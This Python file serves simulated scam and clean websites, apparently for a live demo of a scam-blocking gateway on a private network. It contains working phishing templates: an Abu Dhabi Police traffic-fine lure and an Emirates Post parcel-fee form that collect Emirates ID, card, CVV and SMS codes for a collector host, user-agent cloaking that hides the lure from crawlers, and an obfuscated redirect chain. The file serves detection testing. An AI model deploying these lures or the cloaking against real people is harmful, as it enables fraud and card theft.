"""Simulated scam and clean websites for the live demo, one scenario per host name.

Served only on the private compose network (see the `demo-sites` service): the gateway and the engine
reach these names through Docker network aliases, and a phone reaches them through the gateway, whose
DNS hook answers from Docker's resolver. Nothing here is published on a host port.

    demo.test                  launcher page with a link to every scenario
    oasisroastery.com          (a) clean small business: unknown, held, then allowed
    uae-trafficfines-pay.com   (b) bilingual traffic-fine lure asking for Emirates ID, card and OTP,
                                   posting to another host: blocked at the page layer
    go2ae.link                 (c) short link: HTTP redirect, meta refresh, then a JavaScript redirect to (b)
    sandrosetours.com          (d) clean first page whose booking link leads to a card form: allowed,
                                   then revoked when the deep crawl reaches the payment page
    epost-redelivery-ae.com    (e) cloaking: a gardening blog for crawlers, a parcel-fee card form for mobile Chrome
    appupdate-cdn-ae.net       (f) empty page shell with a deliberately scrambled script
    secure-collect-pay.net     where (b), (d) and (e) send what victims type

All host names are fictitious (checked unregistered) and resolve only inside the demo network. Every
page shows a "simulated page" line in English and Arabic, drawn by the stylesheet so it stays out of the
analysed page text. Brands are named in plain text only; no real organisation's logo, markup, styling or
images are used.
"""

import argparse
import base64
import datetime
import os
import ssl
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlsplit

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from tests.fixtures.server import SCRAMBLED_JS, blog, page, shop  # noqa: E402

COLLECTOR = "secure-collect-pay.net"
HOSTS = ("demo.test", "oasisroastery.com", "uae-trafficfines-pay.com", "go2ae.link", "sandrosetours.com",
         "epost-redelivery-ae.com", "appupdate-cdn-ae.net", COLLECTOR)

# The disclaimer is visible to people but not part of the page text the engine analyses: it is CSS
# generated content in an external stylesheet, so it never appears in the HTML, its title or metadata.
DISCLAIMER_CSS = """@charset "utf-8";
body::after{display:block;max-width:520px;margin:16px auto;font-size:12px;color:#6b7785;text-align:center;
content:"Simulated page for a security demonstration · صفحة محاكاة لعرض توضيحي أمني"}
"""


def with_footer(html: str) -> str:
    return html.replace("</head>", '<link rel="stylesheet" href="/assets/site.css"></head>')


def launcher() -> str:
    rows = [
        ("http://oasisroastery.com/", "a · Clean small business", "متجر صغير سليم"),
        ("http://uae-trafficfines-pay.com/", "b · Traffic fine payment lure", "صفحة دفع مخالفات مزيفة"),
        ("http://go2ae.link/r/fine", "c · Short link with hidden redirects", "رابط مختصر بإعادة توجيه مخفية"),
        ("http://sandrosetours.com/", "d · Clean tour operator, scam behind the booking link", "صفحة سليمة وخلفها دفع احتيالي"),
        ("http://epost-redelivery-ae.com/", "e · Cloaking parcel-fee scam", "احتيال رسوم شحنة مع إخفاء"),
        ("http://appupdate-cdn-ae.net/", "f · Empty page with scrambled script", "صفحة فارغة بنص برمجي مشوش"),
    ]
    links = "".join(f'<div class="item"><a href="{u}">{en}</a><br><span lang="ar" dir="rtl">{ar}</span></div>'
                    for u, en, ar in rows)
    return page("Mirsad demo sites", f"<header>Mirsad demo</header><main><h1>Scenarios</h1>{links}</main>")


def traffic_fine() -> str:
    body = (
        "<header>Abu Dhabi Police · Traffic Fines Payment · شرطة أبوظبي · دفع المخالفات</header><main>"
        "<h1>Unpaid traffic fine: AED 1,500</h1>"
        "<p>A speed camera violation is registered against your Emirates ID. Pay within 24 hours to receive a "
        "50% discount and avoid vehicle impoundment and black points.</p>"
        '<p lang="ar" dir="rtl">مخالفة رادار مسجلة على رقم هويتك الإماراتية. ادفع خلال ٢٤ ساعة لتحصل على خصم ٥٠٪ '
        "وتتجنب حجز المركبة والنقاط السوداء.</p>"
        f'<form action="http://{COLLECTOR}/submit" method="post">'
        '<label for="eid">Emirates ID · رقم الهوية</label><input id="eid" name="emirates_id" placeholder="784-XXXX-XXXXXXX-X">'
        '<label for="plate">Plate number · رقم اللوحة</label><input id="plate" name="plate">'
        '<label for="cc">Card number · رقم البطاقة</label><input id="cc" name="ccnum" inputmode="numeric" autocomplete="cc-number">'
        '<label for="exp">Expiry · تاريخ الانتهاء</label><input id="exp" name="exp" autocomplete="cc-exp">'
        '<label for="cvv">CVV</label><input id="cvv" name="cvv" maxlength="4">'
        '<label for="otp">SMS verification code · رمز التحقق</label>'
        '<input id="otp" name="otp" autocomplete="one-time-code" maxlength="6">'
        "<button>Pay AED 750 now · ادفع الآن</button></form></main>"
    )
    return page("Pay traffic fine - 50% discount today", body)


def card_form(title: str, heading: str, text: str, amount: str) -> str:
    body = (
        f"<header>{title}</header><main><h1>{heading}</h1><p>{text}</p>"
        f'<form action="http://{COLLECTOR}/submit" method="post">'
        '<label>Name on card<input name="holder" autocomplete="cc-name"></label>'
        '<label>Card number<input name="ccnum" inputmode="numeric" autocomplete="cc-number"></label>'
        '<label>Expiry (MM/YY)<input name="exp" autocomplete="cc-exp"></label>'
        '<label>CVV<input name="cvv" maxlength="4"></label>'
        '<label>Code sent by SMS<input name="otp" autocomplete="one-time-code"></label>'
        f"<button>Pay {amount}</button></form></main>"
    )
    return page(title, body)


def safari_home() -> str:
    tours = [("Morning dune drive and sandboarding", "AED 180"), ("Sunset camel trek with dinner", "AED 260"),
             ("Overnight desert camp", "AED 420")]
    body = (
        "<header>Sandrose Tours</header><main><h1>Small-group desert tours from Abu Dhabi</h1>"
        "<p>Family-run since 2012. Hotel pick-up included, children under five ride free.</p>"
        + "".join(f'<div class="item">{n}<span class="price">{p}</span></div>' for n, p in tours)
        + '<p><a href="/booking/pay">Book a tour</a> · <a href="/about">About us</a></p></main>'
    )
    return page("Sandrose Tours - Abu Dhabi", body)


def safari_about() -> str:
    body = ("<header>Sandrose Tours</header><main><h1>About us</h1>"
            "<p>Our guides are licensed and every vehicle is inspected each season.</p>"
            '<p><a href="/">Home</a> · <a href="/booking/pay">Book a tour</a></p></main>')
    return page("About - Sandrose Tours", body)


def shell() -> str:
    return page("Loading", '<div id="app"></div><script src="/static/app.min.js"></script>')


def short_meta() -> str:
    return page("Redirecting", "<p>Please wait…</p>",
                head='<meta http-equiv="refresh" content="0; url=http://go2ae.link/j/fine">')


def short_js() -> str:
    target = base64.b64encode(b"http://uae-trafficfines-pay.com/").decode()
    return page("Loading", "<p>Loading…</p>", head=f'<script>var t="{target}";window.location.replace(atob(t));</script>')


def collected() -> str:
    return page("Payment received", "<main><h1>Thank you</h1><p>Your payment is being processed.</p></main>")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt: str, *args) -> None:
        sys.stdout.write(f"{self.headers.get('Host', '-')} {fmt % args}\n")

    def send(self, status: int, body: str | bytes, ctype: str = "text/html; charset=utf-8", headers: dict | None = None):
        data = with_footer(body).encode() if isinstance(body, str) and ctype.startswith("text/html") else (
            body.encode() if isinstance(body, str) else body)
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        for key, value in (headers or {}).items():
            self.send_header(key, value)
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(data)

    def is_mobile_browser(self) -> bool:
        ua = self.headers.get("User-Agent", "").lower()
        return self.headers.get("sec-ch-ua-mobile") == "?1" and "chrome" in ua and not any(
            bot in ua for bot in ("bot", "crawl", "python", "curl", "headless"))

    def route(self) -> None:
        host = (self.headers.get("Host") or "").split(":")[0].lower()
        path = urlsplit(self.path).path
        pages = {
            ("demo.test", "/"): lambda: self.send(200, launcher()),
            ("oasisroastery.com", "/"): lambda: self.send(200, shop("en")),
            ("uae-trafficfines-pay.com", "/"): lambda: self.send(200, traffic_fine()),
            ("go2ae.link", "/r/fine"): lambda: self.send(302, "", headers={"Location": "http://go2ae.link/m/fine"}),
            ("go2ae.link", "/m/fine"): lambda: self.send(200, short_meta()),
            ("go2ae.link", "/j/fine"): lambda: self.send(200, short_js()),
            ("sandrosetours.com", "/"): lambda: self.send(200, safari_home()),
            ("sandrosetours.com", "/about"): lambda: self.send(200, safari_about()),
            ("sandrosetours.com", "/booking/pay"): lambda: self.send(200, card_form(
                "Sandrose Tours - Secure booking", "Confirm your booking",
                "Enter your card to hold your seats. A verification code will be sent to your phone.", "AED 260")),
            ("epost-redelivery-ae.com", "/"): lambda: self.send(200, card_form(
                "Parcel redelivery · إعادة توصيل الشحنة", "Your parcel is on hold",
                "Emirates Post could not deliver your parcel. Pay the AED 7.50 redelivery fee within 12 hours "
                "or it will be returned to the sender.", "AED 7.50") if self.is_mobile_browser() else blog()),
            ("appupdate-cdn-ae.net", "/"): lambda: self.send(200, shell()),
            ("appupdate-cdn-ae.net", "/static/app.min.js"): lambda: self.send(200, SCRAMBLED_JS, "application/javascript"),
        }
        if path == "/assets/site.css":
            self.send(200, DISCLAIMER_CSS, "text/css; charset=utf-8")
            return
        handler = pages.get((host, path))
        if handler is None:
            self.send(404, page("Not found", "<main><p>Not found</p></main>"))
        else:
            handler()

    def do_GET(self) -> None:
        self.route()

    def do_HEAD(self) -> None:
        self.route()

    def do_POST(self) -> None:
        self.rfile.read(int(self.headers.get("Content-Length") or 0))
        self.send(200, collected())


def tls_context(ca_file: Path, workdir: Path) -> ssl.SSLContext:
    """A certificate for every demo host, issued by the gateway's lab CA so intercept mode can verify it."""
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID

    pem = ca_file.read_bytes()
    ca_key = serialization.load_pem_private_key(pem, password=None)
    ca_cert = x509.load_pem_x509_certificate(pem)
    key = ec.generate_private_key(ec.SECP256R1())
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, HOSTS[1])]))
            .issuer_name(ca_cert.subject).public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1)).not_valid_after(now + datetime.timedelta(days=30))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(h) for h in HOSTS]), critical=False)
            .sign(ca_key, hashes.SHA256()))
    cert_path, key_path = workdir / "demo-sites.crt", workdir / "demo-sites.key"
    cert_path.write_bytes(cert.public_bytes(serialization.Encoding.PEM) + ca_cert.public_bytes(serialization.Encoding.PEM))
    key_path.write_bytes(key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
                                           serialization.NoEncryption()))
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_path, key_path)
    return context


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--ca", type=Path, default=Path("/ca/lab-ca.pem"),
                        help="CA (key and certificate) that signs the HTTPS certificate")
    parser.add_argument("--workdir", type=Path, default=Path("/tmp"))
    parser.add_argument("--https", action=argparse.BooleanOptionalAction,
                        default=os.environ.get("SCAMSHIELD_INTERCEPT") == "1",
                        help="also serve HTTPS (on by default when the gateway runs in intercept mode)")
    args = parser.parse_args()
    servers = [ThreadingHTTPServer(("0.0.0.0", 80), Handler)]
    if args.https and args.ca.exists():
        https = ThreadingHTTPServer(("0.0.0.0", 443), Handler)
        https.socket = tls_context(args.ca, args.workdir).wrap_socket(https.socket, server_side=True)
        servers.append(https)
    for server in servers[1:]:
        threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"demo sites: {', '.join(HOSTS)} on port 80{' and 443' if len(servers) > 1 else ''}", flush=True)
    servers[0].serve_forever()


if __name__ == "__main__":
    main()
